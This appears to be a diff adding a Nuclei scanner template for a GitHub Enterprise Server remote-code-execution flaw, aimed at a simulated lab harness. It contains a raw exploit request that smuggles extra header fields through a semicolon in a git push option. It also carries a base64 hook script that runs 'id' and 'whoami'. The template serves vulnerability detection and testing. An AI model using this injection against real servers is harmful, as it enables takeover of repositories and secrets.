@@ -1,0 +1,80 @@
+id: vt-2026-3854
+
+info:
+  name: GitHub Enterprise Server - X-Stat Field Injection to Pre-Receive Hook RCE (Simulated Lab)
+  author: omarkurt
+  severity: critical
+  description: |
+    GitHub Enterprise Server <= 3.19.1 is vulnerable to remote code execution.
+    babeld copies git push-option values directly into the internal X-Stat
+    header without sanitizing ';' (the header's field delimiter). An
+    authenticated user with push access can inject extra fields
+    (rails_env=development, custom_hooks_dir, repo_pre_receive_hooks) via a
+    single `git push -o` command, disabling the pre-receive hook sandbox and
+    redirecting hook resolution to an attacker-controlled, path-traversed
+    location, resulting in arbitrary command execution as the git service
+    user. This template targets the vt-2026-3854 lab harness, a simulated
+    HTTP reproduction of the vulnerable X-Stat parsing / hook-resolution
+    logic (GHES itself is closed-source and cannot be redistributed).
+  impact: |
+    Full compromise of the git service account. On real GHES this yields
+    access to all repositories and secrets on the instance / storage node.
+  remediation: |
+    Upgrade GitHub Enterprise Server to 3.14.24, 3.15.19, 3.16.15, 3.17.12,
+    3.18.6, 3.19.3 or later.
+  reference:
+    - https://www.wiz.io/blog/github-rce-vulnerability-cve-2026-3854
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 8.7
+    cve-id: CVE-2026-3854
+    cwe-id: CWE-74
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: github
+    product: github_enterprise_server
+  tags: cve,cve2026,cve-2026-3854,github,ghes,rce,field-injection,pre-receive-hook,authenticated
+
+flow: http(1) && http(2)
+
+http:
+  # Step 1: Confirm the target is the vt-2026-3854 lab harness
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "GHES-sim internal relay"
+          - "CVE-2026-3854"
+        condition: and
+        internal: true
+
+  # Step 2: Field-injection exploit - inject rails_env/custom_hooks_dir/
+  # repo_pre_receive_hooks via a semicolon inside a single push option value,
+  # smuggle a hook payload, and confirm it executed as the service user.
+  - raw:
+      - |
+        POST /internal/git-receive HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer demo-user-push-token-123
+
+        {"push_options":["id=nuclei;rails_env=development;custom_hooks_dir=/tmp/nuclei-{{randstr}};repo_pre_receive_hooks=pwn.sh"],"hook_payload":"IyEvYmluL3NoCmVjaG8gVlRfMjAyNl8zODU0X1BXTkVEXyQoaWQgLXUpXyQod2hvYW1pKQo="}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"executed":true'
+          - '"sandboxed":false'
+        condition: and
+
+      - type: regex
+        part: body
+        regex:
+          - 'VT_2026_3854_PWNED_\d+_\w+'
